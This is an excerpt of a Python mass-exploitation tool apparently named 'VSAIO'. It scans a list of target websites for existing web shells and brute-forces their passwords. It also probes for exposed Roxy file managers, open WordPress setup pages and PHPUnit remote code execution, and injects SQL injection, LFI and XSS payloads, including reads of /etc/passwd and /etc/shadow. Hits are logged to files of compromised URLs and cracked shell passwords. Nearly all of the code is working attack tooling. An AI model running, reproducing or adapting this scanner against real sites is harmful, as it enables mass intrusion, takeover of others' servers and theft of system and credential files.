...
try:
    ...
    # If no file is specified, prompt the user for a file path
    file_path = input('Please enter the path to the file: ')
    try:
        target = [i.strip() for i in open(file_path, mode='r', encoding='utf-8', errors='ignore').readlines()]
    ...
    for xox in listaa :
        try :
            ...
            if "BandungXploiter" in req1.text :
                Good = Good + 1
                print(fw+"["+fg+"Scanning"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found ALFA RCE")
                open("goodresult/shell.txt","a").write(check+"\n")
                break
            req2 = x.get(check2, headers=head, timeout=15)
            if "BandungXploiter" in req2.text :
                Good = Good + 1
                print(fw+"["+fg+"Scanning"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found ALFA RCE")
                open("goodresult/shell.txt","a").write(check2+"\n")
                break
            req3 = x.get(check3, headers=head, timeout=15)
            if "BandungXploiter" in req3.text :
                Good = Good + 1
                print(fw+"["+fg+"Scanning"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found ALFA RCE")
                open("goodresult/shell.txt","a").write(check3+"\n")
                break
            else :
                print(fw+"["+fr+"Scanning"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found ALFA RCE")
        except :
            pass
    ...
    for xox in listaa :
        try :
            ...
            if "Roxy file manager" in r.text :
                print(fw+"["+fg+"Scanning"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found RFM")
                open("goodresult/RFM.txt","a").write(url+"\n")
                break
            else :
                print(fw+"["+fr+"Scanning"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found RFM")
        except :
            pass
    ...
    for xox in listaa :
        try :
            ...
            if "<title>WordPress &rsaquo; Setup Configuration File</title>" in req.text and '<option value="" lang="en" selected="selected" data-continue="Continue" data-installed="1">English (United States)</option>' in req.text :
                print(fw+"["+fg+"Scanning"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found WpSetup")
                open("goodresult/WpSetUp.txt","a").write(url+"\n")
                break
                ...
                print(fw+"["+fg+"Scanning"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found WpInstall")
                open("goodresult/WpInstall.txt","a").write(url+"\n")
                break
            else :
                print(fw+"["+fr+"Scanning"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found WPI/WPS")
        except :
            pass
    ...
    try :
        ...
        for xox in listaa :
            ...
            if "border:none;background-color:#1e252e;color:#fff;cursor:pointer;" in req or "name='watching' value='submit'" in req or "name='watching' value='>>'" in req or "<form method=post><input type=password name=pass>" in req or "<input type=password name=pass><input type=submit" in req or "method=post>Password:" in req :
                print(fw+"["+fg+"Scanning"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Shell")
                x.post(''+url)
                open("goodresult/shellpw.txt","a").write(url+"\n")
                ...
                for pw in listpw :
                    ...
                    if "-rw-r--r--" in cek or ">File manager<" in cek or ">Upload file:" in cek or "drwxr-xr-x" in cek or "-rw-rw-rw-" in cek or "drwxrwxrwx" in cek or "Upload File :" in cek or "Writeable" in cek :
                        print(fw+"["+fg+"Scanning"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Pass Shell")
                        open("goodresult/shell.txt","a").write(url+"#"+pw+"\n")
                        open("goodresult/shellcracked.txt","a").write(url+"#"+pw+"\n")
                        break
                    else :
                        print(fw+"["+fr+"Scanning"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found Pass Shell")
                break
                ...
                print(fw+"["+fg+"Scanning"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Shell")
                x.post(''+url)
                open("goodresult/shell.txt","a").write(url+"\n")
            else :
                print(fw+"["+fr+"Scanning"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found Shell")
    except :
        pass
    ...
    try :
        ...
        for xox in listaa :
            ...
            if "PHP License as published by the PHP Group" in cmd.text :
                print(fw+"["+fg+"Scanning"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Phpunit")
                open("goodresult/phpunit.txt","a").write(url+"\n")
                ...
                if "BandungXploiter" in spawn.text:
                    Good = Good + 1
                    print(fw+"["+fg+"Scanning"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Phpunit Shell")
                    open("goodresult/shell.txt","a").write(url2+"\n")
                    break
                else :
                    print(fw+"["+fr+"Scanning"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Vuln Phpunit")
            else :
                print(fw+"["+fr+"Scanning"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found Phpunit")
    except :
        pass
# SQL Injection payloads
sql_payloads = [
    '-', ' ', '&', '^', '*', " or '1'='1", " or 'x'='x", " or 1=1",
    'or true--', 'or 1=1--', 'or 1=1#', 'or 1=1/*', "admin' --", "admin' or '1'='1",
    "admin' or '1'='1'--", "admin' or '1'='1'/*", " or ''='", " or true"
]
bypass_payloads = ["%27%20--", "'%20AND%20'1'='1", "' AND 1=1--", "' OR 1=1--"]

# LFI Payloads
lfi_payloads = [
    '../../../../../../etc/passwd', '../../../../../etc/passwd%00', '../etc/passwd', '/proc/self/environ',
    '/etc/shadow', '/etc/group', '/etc/hosts', '/etc/apache2/apache2.conf', '/var/log/apache2/access.log'
]
...
# Function to crawl and find all links on a page
def crawl_site(url):
    try:
        response = x.get(url, timeout=10, verify=False)
...
# Function to find GET parameters from URL
def find_get_parameters(url):
    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)
    return params.keys()

# Function to find POST parameters from forms on a webpage
def find_post_parameters(url):
    try:
        r = x.get(url, timeout=10, verify=False)
        soup = BeautifulSoup(r.text, 'html.parser')
        forms = soup.find_all('form')
        post_params = []
        for form in forms:
            inputs = form.find_all('input')
            params = [input.get('name') for input in inputs if input.get('name')]
            post_params.extend(params)
        return post_params
    except Exception as e:
        return []
...
def inject_sql(url):
    # Detect GET parameters in the URL
    params = find_get_parameters(url)
    
    for param in params:
        for payload in sql_payloads + bypass_payloads:
            injected_url = url.replace(param + '=', param + '=' + payload)
            try:
                r = x.get(injected_url, timeout=10, verify=False)
                if "SQL syntax" in r.text or "mysql_fetch" in r.text or "ORA-" in r.text:
                    print(fw + "[" + fg + "SQL Injection" + fw + "] " + fw + injected_url + " << " + fg + " Vulnerable!")
                    open("goodresult/sql_injection.txt", "a").write(injected_url + "\n")
                    return True
            except Exception as e:
                pass

    # Detect POST parameters by searching forms
    post_params = find_post_parameters(url)
    
    for param in post_params:
        for payload in sql_payloads + bypass_payloads:
            post_data = {param: payload}
            try:
                r = x.post(url, data=post_data, timeout=10, verify=False)
                if "SQL syntax" in r.text or "mysql_fetch" in r.text or "ORA-" in r.text:
                    print(fw + "[" + fg + "SQL Injection" + fw + "] " + fw + url + " << " + fg + " Vulnerable!")
                    open("goodresult/sql_injection.txt", "a").write(url + "\n")
                    return True
            except Exception as e:
                pass
    return False
...
def inject_lfi(url):
    for payload in lfi_payloads:
        ...
        try:
            r = x.get(injected_url, timeout=10, verify=False)
            if "root:x" in r.text or "nologin" in r.text:
                print(fw + "[" + fg + "LFI" + fw + "] " + fw + injected_url + " << " + fg + " Vulnerable!")
                open("goodresult/lfi.txt", "a").write(injected_url + "\n")
                return True
        except Exception as e:
            pass
    return False
...
def inject_xss(url):
    for payload in xss_payloads:
        injected_url = url + "?xss=" + payload
        try:
            r = x.get(injected_url, timeout=10, verify=False)
            if payload in r.text:
                print(fw + "[" + fg + "XSS" + fw + "] " + fw + injected_url + " << " + fg + " Vulnerable!")
                open("goodresult/xss.txt", "a").write(injected_url + "\n")
                return True
        except Exception as e:
            pass
    return False

# Function to scan the entire site for vulnerabilities automatically
def scan_vulnerabilities(i):
    crawled_urls = crawl_site(i)  # Crawl the site to get all links
    urls_to_scan = set(crawled_urls)  # Use set to remove duplicates
...
def exploit(i):
    try:
        ...
        roxy(i)
        wpins(i)
        scan_vulnerabilities(i)  # Added the scanning for SQL Injection, LFI, XSS
    except:
       pass
...
if __name__ == "__main__":
    ...
    x = """
VSAIO\nCREATE BY [github.com/JagungBakarEnak07]"""
